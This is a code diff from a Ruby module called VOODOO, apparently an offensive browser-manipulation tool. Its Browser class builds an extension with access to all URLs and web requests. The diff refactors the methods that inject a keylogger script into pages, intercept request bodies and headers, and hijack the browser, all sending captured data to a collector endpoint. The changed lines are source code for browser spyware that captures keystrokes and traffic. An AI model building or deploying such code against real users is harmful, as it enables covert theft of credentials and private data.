@@ -5,8 +5,8 @@ module VOODOO
 
     class Browser
         attr_reader :extension
-        attr_accessor :profile
         attr_accessor :bundle
+        attr_accessor :profile
         attr_accessor :process_name
 
         def initialize(bundle: nil, process_name: nil, profile: nil, extension: Extension.new)
@@ -18,23 +18,29 @@ module VOODOO
             @extension.permissions = ['tabs', '*://*/*', 'webRequest']
         end
 
-        def add_script(js, matches: '*://*/*')
-            @extension.add_content_script([matches], js: [js])
+        def add_script(content: nil, file: nil, matches: '*://*/*')
+            if content == nil && file != nil
+                content = File.read file
+            end
+            if content == nil
+                raise StandardError.new(':content or :file argument are required')
+            end
+            @extension.add_content_script([matches], js: [content])
             self
         end
 
-        def keylogger(origins: [], url_include: '')
+        def keylogger(matches: [], url_include: '')
             collector = Collector.new
             collector.on_json {|jsond| yield jsond }
             
             options = {
-                origins: origins,
                 url_include: url_include.downcase,
-                collector_url: "http://localhost:#{collector.port}/"
+                collector_url: collector.url
             }
 
-            keylogger_js = js('keylogger.js', with_options: options)
-            add_script(keylogger_js)
+            keylogger_js = build_js('keylogger.js', with_options: options)
+            @extension.add_content_script(matches, js: [keylogger_js])
+
             @collector_threads.push(collector.thread)
         end
 
@@ -45,10 +51,10 @@ module VOODOO
                 url_include: url_include,
                 body_include: body_include,
                 header_exists: header_exists,
-                collector_url: "http://localhost:#{collector.port}/"
+                collector_url: collector.url
             }
-            background_js = js('intercept.js', with_options: options)
-            @extension.add_background_script background_js
+            background_js = build_js('intercept.js', with_options: options)
+            @extension.add_background_script content: background_js
         end
 
         def hijack(url = '')
@@ -86,7 +92,7 @@ module VOODOO
             return collector
         end
 
-        def js(file, with_options: nil)
+        def build_js(file, with_options: nil)
             str = File.read(File.join(__dir__, 'js', file))
             if with_options != nil
                 str = str.gsub('REBY_INJECTED_OPTIONS', JSON.generate(with_options))
